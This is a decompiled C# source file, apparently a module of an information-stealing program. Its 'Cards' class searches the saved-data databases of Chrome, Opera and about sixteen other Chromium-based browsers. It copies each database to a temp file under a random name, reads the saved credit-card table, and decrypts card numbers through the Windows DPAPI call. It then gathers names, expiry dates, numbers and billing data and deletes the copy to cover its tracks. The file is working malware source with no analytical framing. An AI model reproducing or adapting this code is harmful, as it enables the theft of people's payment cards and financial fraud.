using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Strange.Additions;
using Strange.String;

namespace Strange.Main_Features
{
	// Token: 0x0200001D RID: 29
	internal class Cards
	{
		// Token: 0x06000039 RID: 57 RVA: 0x00004B84 File Offset: 0x00002D84
		public static List<CardData> GetCC()
		{
			List<CardData> list = new List<CardData>();
			string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
			string[] array = new string[]
			{
				environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Web Data",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Web Data",
				environmentVariable + "\\Kometa\\User Data\\Default\\Web Data",
				environmentVariable + "\\Orbitum\\User Data\\Default\\Web Data",
				environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Web Data",
				environmentVariable + "\\Amigo\\User\\User Data\\Default\\Web Data",
				environmentVariable + "\\Torch\\User Data\\Default\\Web Data",
				environmentVariable + "\\BlackHawk\\User Data\\Default\\Web Data",
				environmentVariable + "\\Uran\\User Data\\Default\\Web Data",
				environmentVariable + "\\AcWebBrowser\\User Data\\Default\\Web Data",
				environmentVariable + "\\CoolNovo\\User Data\\Default\\Web Data",
				environmentVariable + "\\Epic Browser\\User Data\\Default\\Web Data",
				environmentVariable + "\\Baidu Spark\\User Data\\Default\\Web Data",
				environmentVariable + "\\Rockmelt\\User Data\\Default\\Web Data",
				environmentVariable + "\\Sleipnir\\User Data\\Default\\Web Data",
				environmentVariable + "\\SRWare Iron\\User Data\\Default\\Web Data",
				environmentVariable + "\\Titan Browser\\User Data\\Default\\Web Data",
				environmentVariable + "\\Flock\\User Data\\Default\\Web Data"
			};
			foreach (string basePath in array)
			{
				List<CardData> list2 = Cards.FetchCards(basePath);
				if (list2 != null)
				{
					list.AddRange(list2);
				}
			}
			return list;
		}

		// Token: 0x0600003A RID: 58
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Cards.DataBlob pCipherText, ref string pszDescription, ref Cards.DataBlob pEntropy, IntPtr pReserved, ref Cards.CryptprotectPromptstruct pPrompt, int dwFlags, ref Cards.DataBlob pPlainText);

		// Token: 0x0600003B RID: 59 RVA: 0x00004D04 File Offset: 0x00002F04
		public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
		{
			Cards.DataBlob dataBlob = default(Cards.DataBlob);
			Cards.DataBlob dataBlob2 = default(Cards.DataBlob);
			Cards.DataBlob dataBlob3 = default(Cards.DataBlob);
			Cards.CryptprotectPromptstruct cryptprotectPromptstruct = new Cards.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(Cards.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (cipherTextBytes == null)
					{
						cipherTextBytes = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
					dataBlob2.cbData = cipherTextBytes.Length;
					Marshal.Copy(cipherTextBytes, 0, dataBlob2.pbData, cipherTextBytes.Length);
				}
				catch (Exception)
				{
				}
				try
				{
					if (entropyBytes == null)
					{
						entropyBytes = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
					dataBlob3.cbData = entropyBytes.Length;
					Marshal.Copy(entropyBytes, 0, dataBlob3.pbData, entropyBytes.Length);
				}
				catch (Exception)
				{
				}
				Cards.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch (Exception)
			{
			}
			finally
			{
				if (dataBlob.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				if (dataBlob2.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				if (dataBlob3.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00004EC8 File Offset: 0x000030C8
		private static List<CardData> FetchCards(string basePath)
		{
			List<CardData> result;
			if (!File.Exists(basePath))
			{
				result = null;
			}
			else
			{
				basePath.Contains("Chrome");
				basePath.Contains("Orbitum");
				basePath.Contains("Opera");
				basePath.Contains("Amigo");
				basePath.Contains("Torch");
				basePath.Contains("Comodo");
				basePath.Contains("BlackHawk");
				basePath.Contains("AcWebBrowser");
				basePath.Contains("Baidu Spark");
				basePath.Contains("Rockmelt");
				basePath.Contains("Sleipnir");
				basePath.Contains("SRWare Iron");
				basePath.Contains("Titan Browser");
				basePath.Contains("Flock");
				basePath.Contains("CoolNovo");
				basePath.Contains("Epic Browser");
				basePath.Contains("Uran");
				try
				{
					string text = Path.GetTempPath() + "/" + NameR.GetName() + ".fv";
					if (File.Exists(text))
					{
						File.Delete(text);
					}
					File.Copy(basePath, text, true);
					Decod decod = new Decod(text);
					List<CardData> list = new List<CardData>();
					decod.ReadTable("credit_cards");
					for (int i = 0; i < decod.GetRowCount(); i++)
					{
						try
						{
							string text2 = string.Empty;
							try
							{
								text2 = Encoding.UTF8.GetString(SavedPass.DecryptBrowsers(Encoding.Default.GetBytes(decod.GetValue(i, 4)), null));
							}
							catch (Exception)
							{
							}
							if (text2 != "")
							{
								list.Add(new CardData
								{
									Name = decod.GetValue(i, 1),
									Exp_m = decod.GetValue(i, 2),
									Exp_y = decod.GetValue(i, 3),
									Number = text2,
									Billing = decod.GetValue(i, 9)
								});
							}
						}
						catch (Exception)
						{
						}
					}
					File.Delete(text);
					result = list;
				}
				catch (Exception)
				{
					result = null;
				}
			}
			return result;
		}

		// Token: 0x0200001E RID: 30
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			// Token: 0x04000026 RID: 38
			public int cbSize;

			// Token: 0x04000027 RID: 39
			public int dwPromptFlags;

			// Token: 0x04000028 RID: 40
			public IntPtr hwndApp;

			// Token: 0x04000029 RID: 41
			public string szPrompt;
		}

		// Token: 0x0200001F RID: 31
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x0400002A RID: 42
			public int cbData;

			// Token: 0x0400002B RID: 43
			public IntPtr pbData;
		}
	}
}
